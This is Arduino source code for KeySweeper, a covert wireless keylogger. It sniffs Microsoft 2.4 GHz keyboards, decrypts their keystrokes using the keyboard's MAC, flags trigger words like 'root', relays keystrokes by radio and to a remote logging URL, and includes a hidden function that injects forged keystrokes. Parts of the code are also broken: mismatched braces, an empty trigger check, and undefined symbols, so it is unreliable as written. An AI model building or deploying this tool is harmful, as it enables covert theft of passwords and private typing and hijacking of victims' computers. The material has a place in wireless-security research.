/*

 KeySweeper, by Samy Kamkar
  - http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/
 - http://goodfet.sourceforge.net/clients/goodfetnrf/
*/
// unknown packets:
// chan 52 -> 
//    08: f0f0 f0f0 3daf 6dc9   593d af6d c959 3df0 
//    08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 
//    08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 
//    08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 

/* pins: arduino nano / uno
 nRF24L01+ radio:
 1: (square): GND
 2: (next row of 4): 3.3 VCC 
 3: CE 9
 4: CSN; 8
 5: SCK: 13
 6: MOSI 11
 7: MISO: 12
 8: IRQ: not used here
 
 W25Q80BV flash:
 */

// log online to this url (only if ENABLE_GSM is defined)
#define URL "samy.pl/keysweeper/log.php?"

// support 2 triggers up to 20 bytes each (change this as you wish)
#define TRIGGERS 2
#define TRIGGER_LENGTH 20
char triggers[TRIGGERS][TRIGGER_LENGTH];
void setTriggers()
{
  strncpy(triggers[0], "", TRIGGER_LENGTH-1);
  strncpy(triggers[1], "root", TRIGGER_LENGTH-1);
}


// pins on the microcontroller
#define CE 53
#define CSN 48 // normally 10 but SPI flash uses 10

#define LED_PIN 6 // tie to USB led if you want to show keystrokes
#define PWR_PIN 7 // are we powered via USB 


// if you want to also monitor the keystrokes live,
// enable shoutKeystrokes, and you can simply listen to
// channel backtraceIt and KeySweeper will announce
// all keystrokes on this channel
boolean shoutKeystrokes = true;

// number of keys to store *just* for our SMS  
#define STACKLEN 128
char stack[STACKLEN];
int stackptr = 0;

// ms to turn led OFF when we see a keystroke
#define LED_TIME 50 // ms
uint32_t strokeTime = 0;

// Serial baudrate
#define BAUDRATE 115200

#define sp(a) Serial.print(F(a))
#define spl(a) Serial.println(F(a))
#define pr(a) Serial.print(F(a))
#define prl(a) Serial.println(F(a))

#include <SPI.h>
#include "nRF24L01.h"
#include "RF24.h"
#include "mhid.h"
#include "printf.h"


#include <EEPROM.h>
// location in atmega eeprom to store last flash write address
#define E_FLASH_ADDY 0x00 // 4 bytes
#define E_SETUP      0x04 // 1 byte [could be bit]
#define E_LAST_CHAN  0x05 // 1 byte
//#define E_CHANS      0x06 // 1 byte
//#define E_FIRST_RUN  0x07 // 1 byte 

#define csn(a) digitalWrite(CSN, a)
#define ce(a) digitalWrite(CE, a)
#define PKT_SIZE 16
#define MS_PER_SCAN 500

//a9399d5fcd,19,08
//a9399d5fcd,34,08
//a9399d5fcd,05,08
//a9399d5fcd,09,08
// my keyboard channel has been on 0x19, 0x34, 0x05, 0x09, 0x2c
/* me love you */long time;
uint8_t channel = 25; // [between 3 and 80]
uint16_t lastSeq = 0;

// all MS keyboard macs appear to begin with 0xCD [we store in LSB]
uint64_t kbPipe = 0xAALL; // will change, but we use 0xAA to sniff
//uint64_t kbPipe = 0xa9399d5fcdLL;

// should we scan for kb or just go based off a known channel/pipe?
// if you turn this off, make sure to set kbPipe to a valid keyboard mac
#define SCAN_FOR_KB 1

// we should calculate this checksum offset by
// calc'ing checksum and xor'ing with actual checksums
uint8_t cksum_idle_offset = 0xFF;
uint8_t cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);

RF24 radio(CE, CSN);

// FINALLY SOME FUNCTIONS! WOOT! 

// decrypt those keyboard packets!
void decrypt(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
    // our encryption key is the 5-byte MAC address (pipe)
    // and starts 4 bytes in (header is unencrypted)
    p[i] ^= kbPipe >> (((i - 4) % 5) * 8) & 0xFF;
}


// calculate microsoft wireless keyboard checksum
void checksum(uint8_t* p, uint8_t ck_i, uint8_t ck_offset)
{
  // calculate our checksum
  p[ck_i] = 0;
  for (int i = 0; i < ck_i; i++)
    p[ck_i] ^= p[i];

  // my keyboard also ^ 0xa0 ... not sure why
  p[ck_i] ^= ck_offset;
}

void push(uint8_t val)
{
  stack[stackptr++] = val;
  if (stackptr > STACKLEN-1)
    stackptr = 0;
}

// if you're looking at this, you found a secret function...
// this INJECTS keystrokes into a machine that uses a MS wireless keyboard ;)
// i will be releasing a project around this soon...
void tx(uint8_t* p, uint8_t key)
{
  radio.setAutoAck(true); // only autoack during tx
  radio.openWritingPipe(kbPipe);
  radio.stopListening();

  // get the HID key
  key = hid_reverse(key);

  // increase our sequence by a massive amount (to prevent overlapping)
  p[5] += 128;

  /*
  // increase our sequence
   p[4]++;
   
   // increment again if we're looking at the first packet
   if (p[9]) 
   p[4]++;
   */

  // place key into payload
  p[9] = key;
  checksum(p, 15, cksum_key_offset);

  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  radio.write(p, 16);

  // now send idle (same seq, idle header, calc cksum, 8 bytes)
  decrypt(p);
  p[6] = 0;
  p[1] = 0x38;
  checksum(p, 7, cksum_idle_offset);

  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  for (int j = 0; j < 7; j++)
    radio.write(p, 8);

  // now send keyup (increase seq, change key, calc cksum)
  decrypt(p);
  p[1] = 0x78;
  p[4]++;
  p[6] = 0x43;
  p[7] = 0x00;
  p[9] = 0x00;
  checksum(p, 15, cksum_key_offset);
  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  radio.write(p, 16);

  radio.setAutoAck(false); // don't autoack during rx
  radio.openWritingPipe(backtraceIt);
  radio.startListening();
}

char gotKeystroke(uint8_t* p)
{
  char letter;
  uint8_t key = p[11] ? p[11] : p[10] ? p[10] : p[9];
  letter = hid_decode(key, p[7]);

  pr("> ");
  Serial.println(letter);

  // store in our temp array
  push(letter);

  // do we have a trigger word?
  for (uint8_t i = 0; i < TRIGGERS; i++)
    // we do!
    if (strlen(triggers[i]) && strstr(stack, triggers[i]))

  // send keystroke to remote live monitor (backtracer)
  // and/or send to our remote server
  sendKeystroke(letter);

  return letter;
}

void sendKeystroke(char letter)
{
  // if we want to shout to the world the keystrokes live
  if (shoutKeystrokes)
  {
    uint8_t buf[PKT_SIZE];
    buf[0] = 'R';
    buf[1] = 'E';
    buf[2] = 'S';
    buf[3] = letter;

    radio.openWritingPipe(backtraceIt);
    radio.stopListening();
    radio.write(&buf, 4);
    radio.startListening();
  }

  // send to our remote server
  post_http(letter);
}

/* microsoft keyboard packet structure:
 struct mskb_packet
 {
 uint8_t device_type;
 uint8_t packet_type;
 uint8_t model_id;
 uint8_t unknown;
 uint16_t sequence_id;
 uint8_t flag1;
 uint8_t flag2;
 uint8_t d1;
 uint8_t key;
 uint8_t d3;
 uint8_t d4; 
 uint8_t d5;
 uint8_t d6;
 uint8_t d7;
 uint8_t checksum; 
 };
 */

uint8_t flush_rx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_RX );
  csn(HIGH);

  return status;
}

uint8_t flush_tx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_TX );
  csn(HIGH);

  return status;
}

void ledOn()
{
  // only turn the led on if we have USB power
  if (digitalRead(PWR_PIN))
    digitalWrite(LED_PIN, HIGH);
  else
    digitalWrite(LED_PIN, LOW);
}

void ledOff()
{
  digitalWrite(LED_PIN, LOW);
}

void loop(void)
{
  uint8_t p[PKT_SIZE], op[PKT_SIZE], lp[PKT_SIZE];
  char ch = '\0';
  uint8_t pipe_num;
  //  spl("loop");

  // if our led is off (flash our led upon keystrokes for fun)
  if (strokeTime && millis() - strokeTime >= LED_TIME)
  {
    strokeTime = 0;
    ledOn();
  }

  // if there is data ready
  if ( radio.available(&pipe_num) )
  {
    uint8_t sz = radio.getDynamicPayloadSize();
    radio.read(&p, PKT_SIZE);
    flush_rx();

    // these are packets WE send, ignore por favor
    if (p[0] == 0x52) // 0x52 == 'R'
      return;
    
    // is this same packet as last time?
    if (p[1] == 0x78)
    {
      boolean same = true;
      for (int j = 0; j < sz; j++)
      {
        if (p[j] != lp[j])
          same = false;
        lp[j] = p[j];
      }
      if (same)
        return;
    }
      return;
    }

    // decrypt!
    decrypt(p);

    // i think this is retransmit?
//    if (p[10] != 0x00)
//      return;      

    pr("    ");
    Serial.print(sz);
    pr(": ");
    for (int i = 0; i < PKT_SIZE/2; i++)
    {
      Serial.print(p[i*2], HEX);
      Serial.print(" ");
      Serial.print(p[i*2+1], HEX);
      Serial.print("  ");
    }
    prl("");

    // keyboard activity!
    if (p[0] == 0x0a)
    {
      // turn led off to signify keystroke
      ledOff();
      strokeTime = millis();
    }

    // keypress?
    // we will see multiple of the same packets, so verify sequence is different
    if (p[0] == 0x0a && p[1] == 0x78 && p[9] != 0 && lastSeq != (p[5] << 8) + p[4])
    {
      lastSeq = (p[5] << 8) + p[4];
      ch = gotKeystroke(p);
      for (int j = 0; j < PKT_SIZE; j++) op[j] = p[j];
    }
  }

  if (ch == 'x')
    tx(op, 'z');
}


uint8_t n(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  csn(HIGH);
  return status;
}

uint8_t n(uint8_t reg, const uint8_t* buf, uint8_t len)                                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    SPI.transfer(*buf++);
  csn(HIGH);

  return status;
}


// specifically for sniffing after the scan
// and transmitting to a secondary device
void setupRadio()
{
  spl("2setupRadio");

  radio.stopListening();

  //  radio.openWritingPipe(kbPipe);
  radio.openWritingPipe(backtraceIt);
  radio.openReadingPipe(0, backtraceIt);
  radio.openReadingPipe(1, kbPipe);

  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  radio.setChannel(channel);
  n(0x03, 0x03);

  radio.startListening();
  spl("SetupRadio_OK");
  //radio.printDetails();
}


/*
void pipe(uint64_t address)
 {
 n(RX_ADDR_P0, reinterpret_cast<const uint8_t*>(&address), 5);
 }
 */


uint8_t read_register(uint8_t reg, uint8_t* buf, uint8_t len)                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( R_REGISTER | ( REGISTER_MASK & reg ) );
  while ( len-- )
    *buf++ = SPI.transfer(0xff);

  csn(HIGH);

  return status;
}

// scans for microsoft keyboards
// we reduce the complexity for scanning by a few methods:
// a) looking at the FCC documentation, these keyboards only communicate between 2403-2480MHz, rather than 2400-2526
// b) we know MS keyboards communicate at 2mbps, so we don't need to scan at 1mbps anymore
// c) we've confirmed that all keyboards have a mac of 0xCD, so we can check for that
// d) since we know the MAC begins with C (1100), the preamble should be 0xAA [10101010], so we don't need to scan for 0x55
// e) we know the data portion will begin with 0x0A38/0x0A78 so if we get that & 0xCD MAC, we have a keyboard!

void scan()
{

  spl("scan");

  uint8_t p[PKT_SIZE];
  uint16_t wait = 10000;

  // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
   channel = EEPROM.read(E_LAST_CHAN);
  
  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  n(0x02, 0x00); 
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  n(0x03, 0x00);
  radio.openReadingPipe(0, kbPipe);
  radio.disableCRC();
  radio.startListening();
  
  //radio.printDetails();

  
  // from goodfet.nrf - thanks Travis Goodspeed!
  while (1)
  {
      
    if (channel > 80)
      channel = 3;

    sp("Tuning to ");
    Serial.println(2400 + channel);
    radio.setChannel(channel++);
   
   
    time = millis();
    while (millis() - time < wait)
    {     
      if (radio.available())
      {
      
        radio.read(&p, PKT_SIZE);
        if ((p[6] & 0x7F) << 1 == 0x0A)
        {
          sp("Potential keyboard: ");
          for (int j = 0; j < 8; j++)
          {
            Serial.print(p[j], HEX);
            sp(" ");
          }
       
          // packet control field (PCF) is 9 bits long, so our packet begins 9 bits in
          // after the 5 byte mac. so remove the MSB (part of PCF) and shift everything 1 bit
          if ((p[6] & 0x7F) << 1 == 0x0A && (p[7] << 1 == 0x38 || p[7] << 1 == 0x78))
          { 
            channel--; // we incremented this AFTER we set it
            sp("KEYBOARD FOUND! Locking in on channel ");
            Serial.println(channel);
            EEPROM.write(E_LAST_CHAN, channel);

            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }
        }
      }
    }

    // reset our wait time after the first iteration
    // because we want to wait longer on our first channel
    wait = MS_PER_SCAN;

  }
}

void setup()
{
  pinMode(LED_PIN, OUTPUT);
  ledOn();

  Serial.begin(BAUDRATE);

  setTriggers();
 

  spl("Radio setup");
  radio.begin();
  spl("End radio setup");
  // make sure to resetup radio after the scan
  setupRadio();
}




